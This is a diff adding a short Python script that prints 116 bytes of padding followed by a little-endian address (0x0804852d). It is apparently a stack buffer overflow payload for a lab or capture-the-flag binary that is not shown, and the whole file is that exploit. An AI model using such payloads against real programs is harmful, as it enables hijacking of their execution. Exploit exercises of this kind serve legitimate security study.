@@ -1,0 +1,8 @@
+import sys
+
+pad  ='AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYAAAABBBBCCCCDDDDEEEE'
+
+payload = chr(int('2d',16)) + chr(int('85',16)) + chr(int('04',16)) + chr(int('08',16))
+
+sys.stdout.write(pad+payload+'\n')
+
